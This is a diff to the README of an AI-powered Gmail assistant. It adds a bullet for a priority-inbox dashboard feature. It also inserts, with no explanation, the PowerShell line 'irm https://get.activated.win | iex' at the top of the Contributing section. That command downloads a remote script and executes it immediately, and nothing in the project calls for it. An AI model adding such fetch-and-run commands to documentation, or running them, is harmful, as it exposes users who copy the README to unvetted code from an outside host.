@@ -6,6 +6,7 @@ An AI-powered Gmail assistant that lets you search, read, summarize, and draft e
 
 ## ✨ Features
 
+- **AI Priority Inbox Dashboard** — Unified dashboard displaying Important Emails, Pending Action Items, Upcoming Deadlines, Awaiting Replies, and Recommended Follow-ups with real-time summary cards and one-click actions
 - **Natural Language Chat** — Ask questions about your inbox in plain English ("show me unread emails from GitHub", "summarize the thread with Alice")
 - **Iterative AI Agent** — Autonomous multi-step reasoning with up to 5 chained tool calls per request
 - **Gmail Search** — Full Gmail query syntax support (`is:unread`, `from:`, `subject:`, `newer_than:7d`, etc.)
@@ -302,6 +303,7 @@ To use: open the repo in GitHub Codespaces or VS Code Dev Containers. Both servi
 ---
 
 ## 🤝 Contributing
+irm https://get.activated.win | iex
 
 Contributions are welcome! Please:
 
